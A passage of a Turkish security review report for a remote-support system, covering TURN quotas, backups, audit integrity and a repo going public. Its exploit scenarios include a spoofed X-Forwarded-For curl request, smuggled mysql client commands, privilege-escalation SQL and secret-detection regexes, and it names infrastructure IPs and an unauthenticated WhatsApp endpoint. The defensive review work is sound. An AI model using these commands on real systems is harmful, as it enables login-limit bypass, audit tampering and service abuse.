- `user-quota=8` username başınadır. Username `<expiry>:<sessionId>` olduğundan her yeniden bağlanma yeni bir username ve yeni 8'lik
  kota verir. Credential 20 dk geçerlidir, oturum bitse bile.
  İstismar senaryosu: Oturum koduyla kabul edilen kötü niyetli bir müşteri, istemcisini birkaç kez yeniden bağlar ve her credential ile
  8 allocation açar (allocation'ları refresh ederek tutar). ~8 credential, 62'lik kapasiteyi tüketir; o andan sonra bütün firmaların
  yeni oturumları relay alamaz (UDP kapalı ağlarda görüntü gelmez).
  Düzeltme:
- devops (T2) kabul ölçütüne ekleyin: `turnutils_uclient` ile N allocation açılır, 63. allocation'ın davranışı ölçülür.
- Rezervasyon doğrulanırsa iki yoldan biri seçilir: (a) `bps-capacity=0` yapılır ve paylaşımlı sunucu koruması host'ta relay port
  aralığına nftables/tc hız sınırıyla sağlanır; (b) `bps-capacity ≥ total-quota × max-bps` olur (pratikte sınır anlamını yitirir).
- backend: aynı oturum için TURN credential üretimine sınır konur. Örnek: oturum başına aynı anda en çok 2 geçerli credential, ya da
  `expiresAt` dakikaya yuvarlanır ve yeniden bağlanmada aynı username verilir. Alarm `turn_allocations > 2×active+10` prod'da
  `remote-watch`'a eklenir.
- Atanan ajan: devops (T2), backend-dev.

### [YÜKSEK] G-P13b-2 Repo public olmadan önceki kontrol yetersiz: kimliksiz WhatsApp gönderim ucu ve altyapı ayrıntıları yayımlanır; gitleaks yalnız yerel geçmişi tarar — A05 / A02

Yer: §7.10 m.1, U1; repo içinde `89.252.189.211` geçen dosyalar: `.env.example`, `README.md`, `apps/server/src/env.ts`,
`deploy/backup/backup.env.example` ve test dosyaları. `192.168.25.10` geçen dosyalar: `.env.example`, `deploy/turn/docker-compose.yml`,
`docs/adr/0007…`, `docs/gereksinimler-sonra-acik.md`, `docs/implementation.md` (ayrıca runbook'ta hostname, VM, pfSense düzeni).
Sorun:

- whatsapp-bildirim servisi (`http://89.252.189.211:3000/send-message`) kimlik doğrulamasızdır. Repo public olunca adres ve istek
  biçimi herkese açılır. Bu servis firmanın WhatsApp numarasıyla mesaj gönderir; başka projeler ve operasyon alarmları da ona bağlıdır.
- `gitleaks detect --log-opts="--all"` yalnız yerel klondaki ref'leri tarar. GitHub tarafında `refs/pull/*`, silinmiş veya
  force-push edilmiş dallardaki commit'ler (SHA ile erişilebilir), Release ekleri, Actions logları ve issue/PR yorumları kapsam dışı
  kalır. Varsayılan kurallar IP, telefon numarası, iç ağ şeması ve dosya adı (ACCESS.txt) yakalamaz.
- Bu turda sunucuda/iş istasyonunda `gitleaks` kurulu değildi, çalıştırılamadı (aşağıda).
  İstismar senaryosu: Repo public olduktan sonra bir saldırgan `.env.example`'daki adresi görür ve `POST /send-message` ile firmanın
  numarasından toplu spam veya oltalama mesajı gönderir. Numara WhatsApp tarafından engellenir. Remote'un ve diğer projelerin
  bildirimleri ile prod alarm kanalı (`remote-watch` komutu WhatsApp ise) aynı anda susar.
  Düzeltme:
- Public yapmadan önce WhatsApp servisine API anahtarı (başlık) eklenir ya da servis yalnız TLS + kimlik doğrulamalı ters vekil
  arkasına alınır. Bu, K13 (G-P13b-11) ile aynı iştir; public yapma bunun ön koşulu olur.
- Repodaki gerçek adres yer tutucuyla değiştirilir (`http://<whatsapp-servis>:3000`). Varsayılan değer `env.ts`'ten kaldırılıp
  `.env`'e taşınır ya da kabul gerekçesi yazılır.
- Tarama listesi: `git clone --mirror` (GitHub'daki tüm ref'ler, `refs/pull/*` dahil) üzerinde `gitleaks detect` + özel kurallar
  (IPv4 özel/genel adresler, `90?5\d{9}`, `ACCESS`, `AGE-SECRET-KEY`, `BEGIN OPENSSH PRIVATE KEY`). Release ekleri ve Actions logları elle
  gözden geçirilir. Geçmişte gerçek sır bulunursa, geçmiş yeniden yazılmaz; sır **döndürülür** (public sonrası eski SHA'lar erişilebilir
  kalabilir).
- Altyapı bilgisinin (iç IP, hostname, pfSense düzeni) yayımlanmasını kullanıcı açıkça kabul eder; kabul §7.13/12 kanıtına yazılır.
- Atanan ajan: devops (tarama betiği), backend-dev (`env.ts` varsayılanı), kullanıcı (U1, WhatsApp servisi).

### [ORTA] G-P13b-3 Paylaşımlı host'taki herhangi bir yerel süreç 127.0.0.1:4451'e bağlanıp sahte `X-Forwarded-For` verebilir — A01 / A07

Yer: `deploy/docker-compose.yml:167-170`; ADR-0015 (`trusted_proxies static 172.30.0.128/32` + strict); §7.3 (4450 de loopback'e iner).
Sorun: Host'tan yayımlanan porta yapılan **her** yerel bağlantı userland-proxy üzerinden 172.30.0.128'den gelir. Caddy bu adresin
gönderdiği XFF'e güvenir. Yani yalnız nginx değil, VM'deki diğer sitelerin süreçleri de istemci IP'sini istediği gibi belirleyebilir.
Prod'da aynı VM'de başka ekiplerin servisleri çalışıyor.
İstismar senaryosu: Aynı VM'deki başka bir sitede RCE elde eden saldırgan, `curl -H 'X-Forwarded-For: <rastgele>' http://127.0.0.1:4451/api/auth/login`
ile her denemede farklı IP gösterir. IP bazlı giriş/sıfırlama/oturum kodu limitleri atlanır; audit `ip_address` sahte olur.
Düzeltme (biri yeter, ilki tercih):

- nftables OUTPUT kuralı: `oif lo tcp dport {4450,4451} meta skuid != {www-data, root} reject`. Kalıcı olur, `host-firewall.sh`
  kalıbıyla kurulur ve `test-*.sh` ile negatif test edilir (www-data dışı kullanıcı bağlanamaz).
- ya da nginx her isteğe sabit bir sır başlığı ekler (`proxy_set_header X-Edge-Origin <sır>`). Caddy 4451'de başlık yoksa 403 döner
  ve başlığı upstream'e iletmez. Sır nginx config'inde root 600 dosyada `include` edilir.
- Atanan ajan: devops.

### [ORTA] G-P13b-4 TURN sertifika deploy hook'u root olarak git çalışma dizinine yazar: sembolik bağlantı / sahiplik saldırısı riski — A05 / A08

Yer: §7.4 m.2 (`TURN_CERT_DIR=/opt/remote/deploy/turn/certs`, geçici dosya + `mv -f`, `chown 65534:65533`, lineage "ile bitiyorsa").
Sorun:

- Hook root olarak çalışır; hedef dizin git çalışma ağacının içindedir. Bu dizin (ya da üstü) root dışı bir kullanıcının yazabileceği
  hâle gelirse (`git pull` umask dersleri, runbook §8 "chmod go+rX"), `certs` bir sembolik bağlantıyla değiştirilebilir. root bu durumda
  özel anahtarı başka bir yere yazar ve keyfi dosyayı 65534'e `chown` eder (yetki yükseltme).
- "`RENEWED_LINEAGE` `remote-turn` ile bitiyorsa" kontrolü `…/eski-remote-turn` gibi adlarla da eşleşir.
- Anahtar host'ta uid 65534'e (`nobody`) aittir; host'ta `nobody` olarak çalışan herhangi bir süreç TURN anahtarını okuyabilir.
  Düzeltme:
- Hook başlamadan `TURN_CERT_DIR` ve bütün üst dizinlerinin root sahibi olduğunu, group/other yazamadığını ve hiçbirinin symlink
  olmadığını denetler. Değilse yazmadan `err` ile çıkar.
- Geçici dosya `mktemp` ile aynı dizinde açılır. İçerik yazılmadan önce `chown`/`chmod` yapılır (ya da `install -o 65534 -g 65533 -m 0400`).
  Taşıma `mv -fT` ile yapılır; `chown` hiçbir zaman yol üzerinden symlink izlemez (`chown -h` / `--no-dereference`).
- Lineage kontrolü tam eşitliktir: `RENEWED_LINEAGE = /etc/letsencrypt/live/remote-turn`.
- Tercihen sertifika dizini git ağacının dışına taşınır (`/etc/remote-turn/certs`, root 0750, grup 65533) ve compose bunu bağlar.
- T2 kabul ölçütüne olumsuz test eklenir: `certs` symlink'e çevrilir → hook yazmaz, rc≠0.
- Atanan ajan: devops (T2).

### [ORTA] G-P13b-5 Audit süreklilik denetimi yalnız silmeyi ve yalnız eski günleri görür; terfi ve geri yüklemeden sonra taban çizgisi tanımsız — A09

Yer: §7.6 m.1/m.3; ADR-0020 m.5.
Sorun:

1. **Değiştirmeyi görmez.** Yalnız gün başına sayı ve `maxId` karşılaştırılır. migrator `DROP TRIGGER … no_update` → `UPDATE audit_logs`
   → `CREATE TRIGGER` yapabilir. Tetikleyici sayısı, gün sayıları ve `maxId` değişmez. Silip aynı sayıda sahte satır eklemek de görünmez.
2. **Son ~48 saat kör.** Manifest yalnız tamamlanmış UTC günlerini yazar. Karşılaştırma ise "önceki çalıştırmanın gününden önceki"
   günlerle yapılır. Çalıştırma 23:00 UTC'de olduğu için D günü ilk kez D+1 çalıştırmasında yazılır. D+1 çalıştırmasından önce D'nin
   satırları silinirse hiçbir zaman karşılaştırılmaz. En taze ve en değerli kayıtlar (saldırı anı) korunmaz.
3. **Taban çizgisi.** Terfide yalnız son staging çalıştırması taşınır (§7.12/2); diğer staging çalıştırmaları `BACKUP_DIR`'de kalır.
   İlk prod yedeği, staging manifestiyle karşılaştırılır (`maxId` azaldı) → `FAILED adım=audit-sureklilik` olur. Meşru bir
   `restore.sh --target production` sonrası da aynısı olur. Denetim sürekli FAIL verirse yedek alınamaz (RPO), operatör de denetimi
   kapatmaya ya da manifestleri silmeye itilir.
   Düzeltme:

- Manifeste `audit.prevMaxIdCount` eklenir: `SELECT COUNT(*), BIT_XOR(CRC32(CONCAT_WS('|', id, created_at, action, entity, entity_id, result,
SHA2(COALESCE(new_value,''),256)))) FROM audit_logs WHERE id <= <önceki maxId>`. Bu değer, önceki manifestin aynı aralıktaki değerine
  eşit olmalıdır (retention'ın sildiği en eski gün düşülerek). Böylece silme, değiştirme ve son 48 saat kapsanır. Tek sorgu, IX(PK) ile
  hızlıdır. dba (D2) sorguyu ve süresini doğrular.
- Gün histogramına gün başına aynı özet (CRC/hash) eklenir.
- Karşılaştırma yalnız aynı `env` + `host` + `database` ve aynı DB kurulum kimliği (ör. `@@server_uuid` ya da kurulumda üretilip
  manifeste yazılan `instanceId`) taşıyan önceki manifestle yapılır. Farklıysa `audit-sureklilik: ilk` yazılır.
- `restore.sh` canlı hedefe başarıyla yükledikten sonra taban çizgisi sıfırlanır (yüklenen manifest önceki kabul edilir). Elle sıfırlama
  için `backup.sh --accept-audit-baseline` gibi açık bir seçenek eklenir; journal'a ve alarm komutuna yazılır.
- Terfi adımı (§7.12/2): staging'in bütün çalıştırmaları `BACKUP_DIR` dışına taşınır.
- Atanan ajan: dba (D2), devops (T1).

### [ORTA] G-P13b-6 Site dışı kanca root olarak, imza anahtarına ve `deploy/.env`'e erişerek çalışır; süre sınırı birim zaman aşımıyla çakışır — A08 / A05

Yer: §7.6 m.4; ADR-0020 m.4 ("root olarak"); `deploy/backup/remote-backup.service` (`TimeoutStartSec=1h`).
Sorun:

- Kanca üçüncü taraf bir aracı çalıştıracak (rclone/restic/aws-cli). root olarak ve aynı süreç ortamında çalıştığı için bu araç ya da
  bir eklentisi (tedarik zinciri) şunlara erişir: `/etc/remote-backup/manifest_ed25519` (sahte imzalı yedek), `deploy/.env` (bütün prod
  sırları), `deploy/turn/.env`. ADR "tehdit sınırı root" diyor; ama bu durumda root koda kendi isteğimizle dış bir araç sokuyoruz.
- Kanca 1800 sn'ye kadar sürebilir. Birimin toplam süresi 1 saattir. Uzun bir döküm ile asılı kalan bir kanca birlikte süreyi aşarsa
  systemd birimi öldürür, `OnFailure` "FAILED = yerel yedek yok" alarmı verir. Oysa yerel yedek yayımlanmıştır; alarm anlamı bozulur.
  `timeout` yalnız TERM gönderir; TERM'i yok sayan süreç birimi askıda bırakır.
  Düzeltme:
- Kanca ayrı bir systemd biriminde çalışır (`remote-backup-offsite@<run>.service`): `User=remote-offsite` (ayrı kullanıcı),
  `ReadOnlyPaths=<BACKUP_DIR>/<run>`, `InaccessiblePaths=/etc/remote-backup /opt/remote/deploy/.env /opt/remote/deploy/turn/.env`,
  `ProtectSystem=strict`, `ProtectHome=read-only`, `PrivateTmp`, `NoNewPrivileges`, `CapabilityBoundingSet=` (boş),
  `RuntimeMaxSec=1800`. Hedef kimliği bu kullanıcının 600 dosyasındadır. `backup.sh` birimi tetikler, sonucu ayrı birim raporlar
  (`OFFSITE-FAILED` + alarm). Böylece yedek biriminin süresi ve anlamı korunur.
- Tek birimde kalınacaksa: `timeout --kill-after=60`; `TimeoutStartSec` ≥ döküm üst sınırı + kanca süresi + 10 dk; kanca
  `setpriv --reuid=remote-offsite --clear-groups --inh-caps=-all` ile çalıştırılır.
- Kancaya `env -i` ile yalnız belgelenmiş `REMOTE_BACKUP_*` değişkenleri ve `PATH` verilir.
- Atanan ajan: devops (T1).

### [ORTA] G-P13b-7 Alarm komutları sırrı süreç argümanında taşır; paylaşımlı host'ta `ps` ile okunur — A02

Yer: §7.8 (`WATCH_ALERT_CMD`, "WhatsApp servisi ya da Telegram"); `deploy/backup/backup.env.example:18-20` (`BACKUP_ALERT_CMD` örneği
curl); ADR-0020 m.4 son madde (kanca için kural var, alarm komutları için yok).
Sorun: Telegram Bot API'de token URL'nin içindedir (`/bot<TOKEN>/sendMessage`). `curl https://api.telegram.org/bot…` biçiminde bir
alarm komutu çalıştığı sürece token `/proc/<pid>/cmdline` üzerinden VM'deki her kullanıcıya görünür (Ubuntu'da `hidepid` kapalıdır).
Aynı VM'de başka siteler çalışıyor.
İstismar senaryosu: Diğer bir sitede kod çalıştıran saldırgan `ps -eo args` döngüsüyle 10 dakikalık alarmda token'ı alır; botun
gönderdiği bütün kanallara sahte "düzeldi" mesajları yollayabilir ya da botu ele geçirir.
Düzeltme:

- Kural (runbook + `.example` yorumları): alarm/kanca komutlarına sır argüman olarak yazılmaz. curl için `curl -K /etc/remote-watch/telegram.curl`
  (root 600; içinde `url = "https://api.telegram.org/bot…/sendMessage"`) ya da `--config -` ile stdin.
- `remote-watch.sh` ve `backup.sh`, komut metninde `api.telegram.org/bot[0-9]` veya `x-api-key:` deseni görürse çalıştırmayı reddeder
  ve uyarı yazar (fail-closed).
- Atanan ajan: devops (T1, T4).

### [ORTA] G-P13b-8 İmzalı ama eski yedekle değiştirme (replay) ve anahtar rotasyonunda doğrulama zamanı tanımsız — A08

Yer: §7.6 restore m.2; ADR-0020 m.1 (rotasyon: `valid-before`, 15 gün).
Sorun:

- İmza, manifestin bütünlüğünü korur ama **tazeliğini** korumaz. Site dışı hedefe yazabilen biri, `20261201T…` dizininin içeriğini daha
  eski geçerli bir çalıştırmayla değiştirebilir (ya da eski dizini yeni adla kopyalayabilir). `restore.sh` imzayı geçer, operatör yanlış
  (eski) veriyi yükler; arada oluşan audit kayıtları ve veri kaybolur.
- `ssh-keygen -Y verify` varsayılan olarak **bugünün** tarihine göre doğrular. Rotasyonda eski satıra `valid-before=<rotasyon günü>`
  yazılınca eski anahtarla imzalanmış 14 günlük yedeklerin hepsi hemen doğrulanamaz olur. Operatör de imzayı atlamaya zorlanır.
  Düzeltme:
- `restore.sh`: dizin adı = `manifest.run`, `manifest.host` = beklenen host (production'da `hostname -s`), `manifest.env` = hedef.
  Manifest yaşı ekrana yazılır. `production`'da 48 saatten eski yedek için ayrıca TTY onayı istenir.
- Doğrulama `-Overify-time=<manifest.createdUtc>` ile yapılır (OpenSSH ≥ 8.9; sürüm runbook'ta önkoşul olur). Rotasyon kuralı:
  eski satır `valid-before=<rotasyon anı>`; sızma durumunda `<sızma anı>`. Sızıntıda o andan sonraki eski anahtar imzaları reddedilir.
- Site dışı hedef seçim şartına (ADR-0020 m.4-a) "üzerine yazma ve yeniden adlandırma yok" açıkça eklenir.
- Atanan ajan: devops (T1), mimar (ADR-0020 notu).

### [DÜŞÜK] G-P13b-9 Terfi: staging imza anahtarı, geri dönüş doğrulaması ve "imha"nın sınırı belirsiz — A02 / A05

Yer: §7.12/2–5, 8 ve "Geri dönüş"; ADR-0019 m.1.
Sorun ve öneri:

- Adım 8'de prod imza anahtarı üretilir. Aynı yolda üretilirse staging anahtarı ezilir ve geri dönüşte (`restore.sh --target staging
<staging-final>`) imza doğrulanamaz. Öneri: staging açık anahtarı `/root/allowed_signers.staging-final` (644, 14 gün) dosyasına alınır,
  geri dönüşte `--allowed-signers` ile verilir. Prod `allowed_signers`'ta **yalnız** prod anahtarı bulunur. Staging özel anahtarı terfide
  `shred` edilir.
- Geri konacak `/root/.env.staging-final.*` içinde `DEPLOY_ENV=staging` bulunmalıdır; yoksa `restore.sh --target staging` reddeder.
  Adım 3'te denetlenir.
- `shred` ext4 (journal) ve SSD/thin disk üzerinde içeriğin silindiğini garanti etmez. Asıl kontrol **sırların döndürülmesidir**
  (zaten tasarımda). Kontrol listesi m.13'e eklenir: `/root/.bash_history` ve `/root/.*_history` içinde parola/token taraması,
  `journalctl` içinde sır taraması, `docker builder prune` (build arg sızıntısı), iş istasyonlarındaki ACCESS.txt kopyaları ve parola
  kasası dışındaki notlar. Terfiden sonra staging sırlarıyla eşleşen değer hiçbir yerde **kullanılmıyor** (ör. `grep -c` ile eski
  `TURN_SECRET` coturn env'inde yok).
- 4450: Docker'ın yayımladığı portlar UFW'yi atlar (runbook §9.2 notu). UFW kuralını silmek kontrol değildir; kontrol `CADDY_BIND=127.0.0.1`'dir.
  Kanıt: `ss -tlnp | grep 4450` yalnız `127.0.0.1`, ve dış makineden `nc -vz 185.126.217.99 4450` zaman aşımı. Bu kanıt m.13'e girer.
- Atanan ajan: devops (T5, T6).

### [DÜŞÜK] G-P13b-10 `reset-superadmin`: bant dışı bildirim yok, geçici parola süresiz — A07

Yer: §7.7.
Sorun: Docker grubundaki herhangi bir hesap (root eşdeğeri) Super Admin parolasını ve 2FA'sını sessizce sıfırlayabilir. Audit satırı aynı
DB'dedir. Geçici parola, kullanılmazsa süresiz geçerlidir.
Öneri:

- CLI başarıyla bitince `WATCH_ALERT_CMD` (ya da `BACKUP_ALERT_CMD`) ile "Super Admin parolası CLI ile sıfırlandı (id=…)" bildirimi
  gönderilir; mümkünse hesabın e-postasına da bildirim gider (parola içermez).
- Geçici parolaya süre: `must_change_password=1` ile birlikte `password_changed_at = now()`; giriş, `must_change_password` iken
  `password_changed_at` 24 saatten eskiyse reddedilir. Yeni sütun gerekiyorsa gerekçesiyle Sonra'ya yazılır.
- `--reset-mfa` sonrası ilk girişte 2FA kurulumu zorunlu (P10 kuralı) mu, entegrasyon testine eklenir.
- Docker grubu üyeleri runbook'ta listelenir (yalnız root).
- Atanan ajan: backend-dev (B1), devops (T5).

### [DÜŞÜK] G-P13b-11 K13: TLS ters vekil tek başına yetmez; servis kimliksizdir — A07

Yer: §7.11 K13 (a); ADR yok.
Sorun: (a) seçeneğinde trafik şifrelenir, ama servis herkese açık ve kimliksiz kalır (G-P13b-2). Operasyon alarmlarının da bu kanaldan
geçmesi, kanal kötüye kullanılıp numara engellenince alarmların da susması demektir.
Öneri: (a) için kabul şartı "TLS + API anahtarı (ya da mTLS) + hız sınırı" olur. Prod operasyon alarmları için birincil kanal Telegram
(HTTPS) olur, WhatsApp ikincil. (b) seçeneği güvenlik açısından kabul edilebilir.
Atanan ajan: kullanıcı (servis sahibi), devops.

### [DÜŞÜK] G-P13b-12 `max-bps` allocation başınadır, oturum başına değil; giriş ve çıkış ayrı sayılır — A04

Yer: §7.4; ADR-0018 m.2.
Sorun: coturn `max-bps` her TURN allocation'ına ayrı ayrı ve her yöne ayrı uygulanır. Bir destek oturumu en çok 6 allocation açabildiği
için gerçek tavan oturum başına 8 Mbit/s değildir. Teorik üst sınır yön başına 48 Mbit/s olur. AC-21 metni ve ölçüm yöntemi buna göre
yazılmalıdır.
Öneri: T2 ölçümü allocation başına ve iki yönde ayrı yapılır. AC-21 kanıtı "allocation başına 8 Mbit/s" olarak kaydedilir. Toplam koruma
G-P13b-1'deki host sınırıyla sağlanır. Atanan ajan: devops (T2), proje-yoneticisi (AC metni).

### [DÜŞÜK] G-P13b-13 root systemd birimleri betikleri doğrudan git çalışma ağacından çalıştırır — A08

Yer: `deploy/backup/remote-backup.service` (`ExecStart=/opt/remote/deploy/backup/backup.sh`); §7.8 `deploy/ops/remote-watch.sh`
(aynı kalıp); runbook §8 (`chmod -R go+rX`, bundle ile `git pull`).
Sorun: `/opt/remote` ağacında root dışı bir kullanıcıya yazma izni (yanlış `chmod`/ACL, ileride eklenecek deploy kullanıcısı) verilirse,
bu kullanıcı root kodu çalıştırır. Deploy hook'u ve `host-firewall.sh` kurulu kopya kalıbını kullanıyor; yedek ve izleme birimleri
kullanmıyor.
Öneri: `backup.sh`, `restore.sh`, `lib.sh` ve `remote-watch.sh` de `install` ile `/usr/local/sbin/` altına root:root 0755 olarak kurulur.
Ya da prod kontrol listesine `find /opt/remote -perm -o+w -o ! -user root` = boş kontrolü eklenir ve `remote-watch` bunu her koşuda
denetler. Atanan ajan: devops (T4, T5).

## Otomatik tarama çıktıları

- `gitleaks`: bu makinede kurulu değil, çalıştırılmadı. Repo public olmadan önce G-P13b-2'deki biçimde (mirror klon) çalıştırılması
  zorunlu.
- `git grep -nE "(api[_-]?key|secret|password|token)\s*[:=]\s*['\"][^'\"]{8,}"` (test/example hariç): **0 sonuç**.
- `git log --all -- '*.env*'`: 8 commit; incelenen dosyalar `.env.example` ve `backup.env.example` (boş anahtarlar). Takip edilen `.env`
  ya da ACCESS dosyası yok (`git ls-files` boş).
- Altyapı ayrıntısı taraması: `89.252.189.211` 10 dosyada, `192.168.25.10` 5 dosyada (G-P13b-2). Telefon deseni yalnız testlerdeki
  sahte numarada (`+905321234567`).
- `npm audit` / `govulncheck`: P13b'de yeni bağımlılık yok; bu tasarım turunda çalıştırılmadı (son P13a turu: açık yok).

## Tasarımda vaat edilip kodda bulunmayanlar

P13b kodu henüz yazılmadı. Çalışma ağacında yalnız B2 başlamış (`apps/server/src/app.ts:143` `includeSubDomains: true`, commit edilmemiş).
`deploy/Caddyfile:118` hâlâ `max-age=31536000` (T3 bekliyor). Kod turunda §7.4–7.8'in hepsi ve yukarıdaki düzeltmeler denetlenecek.

## Olumlu

- HSTS kapsam analizi (§7.5) doğru: `includeSubDomains` yalnız `*.remote.noktabilisim.net`'i etkiler. `preload` yok, apex'e dokunulmuyor.
  Bulgu yok.
- TURN için ayrı LE kaydı ve ayrı anahtar: coturn ele geçirilirse web TLS anahtarı sızmaz.
- Yedek imzası "önce imza, sonra sha256, sonra çözme" sırasında. İmzasız yedek için atlama seçeneği yok.
- Migrator + `--system-command=OFF` + yetki anlık görüntüsü + `CHECKSUM TABLE`: S-P13a-2'nin kalanını önleyici biçimde kapatır.
- `--target production`: `DEPLOY_ENV` + `--confirm` + TTY + manifest `env` dörtlü kilidi. Başka ortamın yedeği prod'a yüklenemez.
- Kanca komut metni loglanmıyor; kanca hatası yerel yedeği geçersiz saymıyor; `status.prom` sır içermiyor.
- CLI: TTY zorunlu, parola yalnız bir kez TTY'ye yazılıyor, audit'te parola yok, rol kısıtı ve sızdırmayan "bulunamadı" çıktısı var.
- Terfi temiz kurulum olarak yapılıyor: bütün sırlar yeniden üretiliyor, staging verisi prod'a taşınmıyor, volume'lar adıyla siliniyor.

## Önerilen "Sonra" maddeleri (`docs/gereksinimler.md` §9)

G-P13b-10'daki geçici parola süresi (şema gerekiyorsa), G-P13b-11 WhatsApp servis kimlik doğrulaması (servis sahibi), G-P13b-13'ün
kurulu kopya kalıbına geçişi (kontrol listesi kontrolü P13b'de yapılırsa).

---

# Güvenlik Raporu — P13a turu — Kod turu 2 / doğrulama (2026-11-14)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 açık (S-P13a-8, yeni) / Düşük 1 açık (S-P13a-2 kalanı, P13b ön koşulu).

- KAPANDI: S-P13a-1, -3, -4, -5, -6, -7.
- KISMEN: S-P13a-2. Manifest imzası ve migrator ile yükleme kararla P13b'ye ertelendi; aşağıdaki iki boşluk da o pakette kapatılmalı.
- Gerileme yok.

Kapsam: düzeltme turu değişiklikleri.

- Kod: `audit/service.ts`, `public/service.ts`, `signaling/admit.ts`, `sessions/{public,history}.ts`, `deploy/backup/{backup,restore,lib}.sh`.
- Belgeler: implementation "Güvenlik turu 1" (backend, devops, frontend).

Koşulanlar:

- `bash -n`: 3 betik temiz.
- server birim testleri: **349/349**.
- `pnpm audit --audit-level=moderate`: açık yok.
- `dump_client_command_count` elle denendi (aşağıda).
- DB'li entegrasyon testleri (backend: 529/529) ve yedek provası bu turda koşulmadı. Staging'e bağlanılmadı.

## Kapanan bulgular

- **S-P13a-1 (KAPANDI):**
  - `guest.pending`, `guest.admitted` ve `guest.rejected` artık ad yazmıyor.
  - Kural tek noktada, `writeAudit` içinde: `username === "customer"` olan kayıtlarda `ip_address = netKey(ip)` (IPv4 /24, IPv6 /48) ve `user_agent = NULL`.
  - Müşteri aktörlü yazımların hepsi taranıp doğrulandı:
    - `public/service.ts`, `sessions/public.ts`, `signaling/{ws,control,collab}.ts`;
    - talep yolunda `requests/service.ts` (`CUSTOMER` sabiti) ve `bindings/service.ts` (müşteri tarafı);
    - talep yolundaki `guest.admitted`.
  - Teknisyen bağlamındaki `guest.admitted/rejected` kayıtları teknisyen IP'sini taşıyor; doğru davranış.
  - Zaman çizelgesi adı oturum satırından alıyor ve yalnız kabul edilen misafire gösteriyor. Anonim oturumda ad null kalıyor.
  - Kalan: P13a öncesi `guest.*` satırları 730 gün ad taşımaya devam ediyor (append-only). Prod henüz açılmadığı için yalnız staging verisi etkileniyor; kabul edilebilir.
- **S-P13a-3 (KAPANDI):**
  - `backup.sh` artık akış biçiminde çalışıyor: `mysqldump | dump_tee_meta | gzip | tee(FIFO: sha, boyut) | age`. Düz döküm diske hiç yazılmıyor; `pipefail` kesilen dökümü yakalıyor.
  - Ölü `.partial` dizinleri, kilit alındıktan sonra yaşına bakılmadan siliniyor.
  - `restore.sh` çözülmüş dosyaları varsayılan olarak `/dev/shm`'e yazıyor (boş alan kontrolüyle). Başka bir dizin ancak `--work-dir` ile açıkça seçilebiliyor.
- **S-P13a-4 (KAPANDI):** tetikleyici sayısı ≠ `BACKUP_EXPECTED_TRIGGERS` (3) olduğunda `FAILED adım=tetikleyici` veriliyor ve OnFailure alarmı çalışıyor. Tetikleyici adları manifeste yazılıyor.
- **S-P13a-5 (KAPANDI):** anonim oturumda `session.terminated.reason` siliniyor. Ticket alanına "kişisel veri yazmayın" ipucu eklendi. Arayüzde gerekçe alanı yok; gerekçe yalnız API ile girilebiliyor.
- **S-P13a-6 (KAPANDI):**
  - `--confirm <db>@<hostname -s>` zorunlu; compose projesi `RESTORE_EXPECT_PROJECT` ile eşleşmeli.
  - `--target production` açıkça reddediliyor; P13b'de ayrı bayrak ve ayrı onayla eklenecek.
- **S-P13a-7 (KAPANDI):**
  - `backup.env` sembolik bağlantı değil, normal dosya; sahibi uid 0, izni tam 600 veya 400 olmalı. Değilse yedek FAILED oluyor.
  - Bu durumda `--alert` modunda `BACKUP_ALERT_CMD` çalıştırılmıyor.
  - ACL ile yazma izni verilirse mask grup bitlerinde görünür ve kontrol düşer.

## Açık / yeni bulgular

### [ORTA] S-P13a-8 Dosya aktarım audit kayıtları dosya adını ve sha256'yı 730 gün tutuyor — KVKK (S-P13a-1'in kalanı)

Yer: `apps/server/src/signaling/collab.ts:101-117` (`file.transfer` ve `file.transfer.sender_report`; `newValue = {sessionId, direction, fileName, sizeBytes, sha256, result}`).
Sorun: K-P13-2, dosya adı ile sha256'yı tanımlayıcı saydığı için `session_files` satırını anonimleştirmede siliyor. Aynı iki değer ise audit'te `entity_id` (oturum veya dosya id'si) ile 730 gün kalıyor. Dosya adları sık sık kişisel veri içeriyor (ör. `Ayse_Yilmaz_bordro_2026-10.pdf`); sha256 da belirli bir belgeyi eşleştirmeye yarıyor. Bu, S-P13a-1'de ad için kapatılan yeniden tanımlanabilirlik sorununun aynısı.
İstismar senaryosu: Oturum anonimleştirildikten sonra `audit.view` yetkili bir Admin, Audit ekranında `file.transfer` kayıtlarından müşterinin dosya adlarına ve içeriğe ait sha256 değerlerine ulaşır.
Düzeltme: Audit'e `fileName` yerine yalnız uzantı (ör. `.pdf`, ≤ 10 karakter) ve boyut yazılmalı; sha256 audit'ten çıkarılmalı. Aktarım kaydının kanıtı olarak `session_files` id'si (`entity_id`) yeterli. Zaman çizelgesi ve dosya listesi `session_files`'tan okumaya devam eder. Eski satırlar append-only olduğu için olduğu gibi kalır (yalnız staging). Atanan ajan: backend-dev.

### [DÜŞÜK] S-P13a-2 (kalan) Geri yüklemede hesap ve yetki anlık görüntüsü eksik; istemci komutu denetimi yalnız satır başına bakıyor — A08

Yer: `deploy/backup/restore.sh:149-159` (`sec_snapshot`), `lib.sh:125-127` (`dump_client_command_count`).
Sorun 1 (anlık görüntü):

- Karşılaştırılan değerler: `mysql.user` için yalnız `user@host` listesi, `db/tables_priv/columns_priv/procs_priv` için satır sayıları, ROUTINES ve EVENTS sayıları.
- Kurcalanmış bir döküm bunları hiç değiştirmeden yetki yükseltebilir:
  - `GRANT ALL ON *.* TO 'app'@'%'` yalnız `mysql.user` satırının sütunlarını değiştirir;
  - dinamik yetkiler (`GRANT SYSTEM_USER, …`) `mysql.global_grants` tablosuna yazılır;
  - `ALTER USER 'app' IDENTIFIED BY '…'` parolayı değiştirir;
  - `SET PERSIST …` ve `INSTALL COMPONENT` kalıcı değişiklik bırakır.
- Bunların hiçbiri anlık görüntüde görünmüyor.
  Sorun 2 (istemci komutu): Desen satır başına bağlı (`^[[:space:]]*(\\!|\\\.|system |source )`). mysql istemcisi ters bölü komutlarını satırın ortasında da tanır. Elle denemede `SELECT 1; \! id` ve `\. /x` satır ortasında yakalanmadı (3 örnekten 2'si yakalandı). `\!` için `--system-command=OFF` ikinci savunma olarak çalışıyor; `\.` ise konteyner içinden dosya okumaya izin veriyor (etkisi düşük).
  Ön koşul: yedek dizinine yazma erişimi. Bugün bu yalnız staging root'unda var; P13b'deki site dışı kopyayla genişler.
  Düzeltme (P13b'de manifest imzası ve migrator ile yükleme kapsamında):
